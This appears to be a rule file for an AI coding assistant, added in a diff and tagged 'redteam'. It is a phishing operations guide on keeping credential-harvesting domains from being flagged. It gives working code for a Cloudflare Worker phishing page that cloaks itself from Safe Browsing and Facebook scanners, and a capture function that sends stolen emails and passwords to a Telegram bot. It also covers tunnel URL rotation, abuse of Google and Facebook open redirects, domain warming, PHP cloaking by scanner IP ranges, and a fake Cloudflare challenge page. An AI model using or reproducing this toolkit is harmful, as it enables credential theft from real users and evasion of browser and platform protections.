@@ -1,0 +1,366 @@
+---
+description: "TAGS: [redteam,domain,flagging,cloudflare,evasion,safebrowsing] | TRIGGERS: domain,flagging,cloudflare,safebrowsing,burned,evasion | SCOPE: infrastructure | DESCRIPTION: Domain anti-flagging strategies using Cloudflare and evasion techniques"
+alwaysApply: false
+---
+# Domain Anti-Flagging Module (2025 Updated)
+
+## Scope
+Strategies to prevent domain flagging and extend operational lifespan.
+
+## Problem: Purchased Domains Get Flagged
+
+Common flagging causes:
+1. **Google Safe Browsing** - Real-time URL scanning
+2. **Facebook URL Scanner** - Internal link checking
+3. **Browser-based detection** - Chrome/Firefox built-in
+4. **Registrar reports** - Domain abuse complaints
+
+## Strategy 1: Cloudflare Workers Hosting
+
+### Why Cloudflare Works
+- Trusted infrastructure (cloudflare.com reputation)
+- Serverless = no fixed IP to blacklist
+- `.workers.dev` subdomain appears legitimate
+- Edge hosting = fast, distributed
+
+### Worker-Based Phishing Template
+```javascript
+// Cloudflare Worker - phish.js
+export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    
+    // Cloaking: Check for scanners
+    const ua = request.headers.get("User-Agent") || "";
+    if (isScanner(ua)) {
+      return serveBenignPage();
+    }
+    
+    // Serve phishing template
+    return new Response(getPhishingHTML(), {
+      headers: {
+        "Content-Type": "text/html;charset=UTF-8",
+        // Remove security headers
+        "X-Frame-Options": "",
+        "Content-Security-Policy": ""
+      }
+    });
+  }
+}
+
+function isScanner(ua) {
+  const scanners = [
+    "googlebot", "bingbot", "facebookexternalhit",
+    "safebrowsing", "crawler", "spider", "slurp"
+  ];
+  return scanners.some(s => ua.toLowerCase().includes(s));
+}
+
+function serveBenignPage() {
+  return new Response(`
+    <!DOCTYPE html>
+    <html>
+    <head><title>Coming Soon</title></head>
+    <body><h1>Site Under Construction</h1></body>
+    </html>
+  `, { headers: { "Content-Type": "text/html" } });
+}
+
+function getPhishingHTML() {
+  // Return your phishing template HTML
+  return PHISHING_TEMPLATE;
+}
+```
+
+### Deployment
+```bash
+# Install Wrangler CLI
+npm install -g wrangler
+
+# Login
+wrangler login
+
+# Create worker
+wrangler init phish-worker
+
+# Deploy (gets *.workers.dev URL)
+wrangler deploy
+```
+
+## Strategy 2: Cloudflare Pages + Functions
+
+### Structure
+```
+/
+├── public/
+│   ├── index.html      # Phishing page
+│   └── assets/
+├── functions/
+│   └── api/
+│       └── capture.js  # Credential capture endpoint
+└── _redirects          # URL rewrites
+```
+
+### Credential Capture Function
+```javascript
+// functions/api/capture.js
+export async function onRequestPost({ request, env }) {
+  const formData = await request.formData();
+  const email = formData.get("email");
+  const password = formData.get("pass");
+  
+  // Send to external collector (Telegram, webhook, etc.)
+  await sendToCollector(email, password, env);
+  
+  // Redirect to real site
+  return Response.redirect("https://www.facebook.com/", 302);
+}
+
+async function sendToCollector(email, pass, env) {
+  const telegramUrl = `https://api.telegram.org/bot${env.TG_TOKEN}/sendMessage`;
+  await fetch(telegramUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: env.TG_CHAT,
+      text: `🔑 Creds Captured:\nEmail: ${email}\nPass: ${pass}`,
+      parse_mode: "HTML"
+    })
+  });
+}
+```
+
+## Strategy 3: Tunneler URL Rotation
+
+### Cloudflared Dynamic URLs
+```python
+# Each tunnel run generates new URL
+# xxx-yyy-zzz.trycloudflare.com
+
+# Rotate every 2-4 hours or per campaign
+import subprocess
+import time
+
+def get_new_tunnel_url():
+    """Start new tunnel and extract URL"""
+    proc = subprocess.Popen(
+        ["cloudflared", "tunnel", "--url", "localhost:8080"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+    
+    # Parse URL from output
+    for line in proc.stderr:
+        if b"trycloudflare.com" in line:
+            url = extract_url(line.decode())
+            return url
+    
+    return None
+
+# Rotation loop
+while True:
+    url = get_new_tunnel_url()
+    distribute_url(url)  # Send to campaign
+    time.sleep(2 * 3600)  # Rotate every 2 hours
+```
+
+## Strategy 4: Open Redirect Exploitation
+
+### Google Open Redirect (2025 Active)
+```
+# Format: google.com/travel/clk?url=<your-url>
+https://www.google.com/travel/clk?url=https://your-phishing-site.com
+
+# Benefits:
+# - Link appears to be from google.com
+# - Bypasses many URL filters
+# - GSB may not scan final destination
+```
+
+### Facebook Open Redirect
+```
+# l.facebook.com redirector
+https://l.facebook.com/l.php?u=<encoded-url>
+
+# WARNING: Facebook monitors this heavily
+# Use sparingly
+```
+
+## Strategy 5: Shadow URL for OG Preview
+
+### shadow_config.php Pattern
+```php
+<?php
+// Use legitimate Wix site for OG preview
+define('SHADOW_URL', 'https://legitimate-site.wixsite.com/news');
+
+function get_shadow_meta_tags() {
+    // Fetch OG tags from shadow URL
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'user_agent' => 'facebookexternalhit/1.1',
+        ]
+    ]);
+    
+    $html = @file_get_contents(SHADOW_URL, false, $context);
+    
+    // Parse and return OG tags
+    return parse_og_tags($html);
+}
+
+$shadow_meta = get_shadow_meta_tags();
+?>
+
+<!-- In index.php head -->
+<meta property="og:title" content="<?php echo $shadow_meta['og_title']; ?>">
+<meta property="og:image" content="<?php echo $shadow_meta['og_image']; ?>">
+```
+
+## Strategy 6: Domain Age Warming
+
+### Fresh Domain Protocol
+```
+Day 1-3: Deploy benign content only
+Day 4-7: Add legitimate-looking pages (about, contact)
+Day 8+: Gradually introduce phishing content
+
+# Automated warming script
+def warm_domain(domain):
+    # Day 1-3: Static HTML
+    deploy_static_site(domain, "coming_soon.html")
+    
+    # Day 4-7: Add pages
+    add_about_page(domain)
+    add_contact_page(domain)
+    
+    # Day 8+: Deploy phishing
+    deploy_phishing_template(domain)
+```
+
+## Strategy 7: Cloaking Implementation
+
+### validate.php Cloaking
+```php
+<?php
+// Bot/Scanner detection
+function is_bot() {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $ip = $_SERVER['REMOTE_ADDR'];
+    
+    // Known scanner user agents
+    $bots = [
+        'googlebot', 'bingbot', 'facebookexternalhit',
+        'safebrowsing', 'crawler', 'spider', 'slurp',
+        'yahoo', 'duckduck', 'baidu', 'yandex'
+    ];
+    
+    foreach ($bots as $bot) {
+        if (strpos($ua, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    // Check for datacenter IPs (scanners often use these)
+    if (is_datacenter_ip($ip)) {
+        return true;
+    }
+    
+    return false;
+}
+
+function is_datacenter_ip($ip) {
+    // Google, Bing, Facebook scanner IP ranges
+    $scanner_ranges = [
+        '66.249.',    // Google
+        '66.102.',    // Google
+        '64.233.',    // Google
+        '72.14.',     // Google
+        '207.46.',    // Bing
+        '157.55.',    // Bing
+        '40.77.',     // Bing
+        '173.252.',   // Facebook
+        '31.13.',     // Facebook
+    ];
+    
+    foreach ($scanner_ranges as $range) {
+        if (strpos($ip, $range) === 0) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// Cloaking logic
+if (is_bot()) {
+    // Serve benign content to scanners
+    header('HTTP/1.1 200 OK');
+    echo '<!DOCTYPE html><html><head><title>Welcome</title></head>';
+    echo '<body><h1>Welcome to our website</h1></body></html>';
+    exit;
+}
+
+// Continue to phishing page for real users
+?>
+```
+
+## Strategy 8: Fake Cloudflare Challenge
+
+### Interstitial Cloaking
+```html
+<!-- fake_cloudflare.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Just a moment...</title>
+    <style>
+        /* Clone Cloudflare challenge styles */
+        body { background: #f5f5f5; font-family: sans-serif; }
+        .container { max-width: 400px; margin: 100px auto; text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f60; 
+                   border-top-color: transparent; border-radius: 50%;
+                   animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="cloudflare-logo.svg" width="100">
+        <h2>Checking your browser before accessing</h2>
+        <div class="spinner"></div>
+        <p>This process is automatic. Your browser will redirect shortly.</p>
+    </div>
+    
+    <script>
+        // Check if scanner (no JS execution = bot)
+        setTimeout(() => {
+            // Real user - redirect to phishing
+            window.location.href = '/login.php';
+        }, 3000);
+    </script>
+</body>
+</html>
+```
+
+## OPSEC Summary
+
+| Strategy | Effectiveness | Risk Level |
+|----------|--------------|------------|
+| Cloudflare Workers | HIGH | LOW |
+| Tunneler Rotation | MEDIUM | LOW |
+| Open Redirects | HIGH | MEDIUM |
+| Shadow URL | HIGH | LOW |
+| Domain Warming | MEDIUM | LOW |
+| Cloaking | HIGH | MEDIUM |
+| Fake CF Challenge | HIGH | MEDIUM |
+
+## Recommended Stack for 2025
+
+```
+1. Cloudflare Workers for hosting (no purchased domain needed)
+2. Tunneler URLs for distribution (rotate frequently)
+3. Shadow URL for OG previews (Wix/legitimate site)
+4. Cloaking via validate.php (block scanners)
+5. Geo-targeting via DataImpulse (session injection)
+```
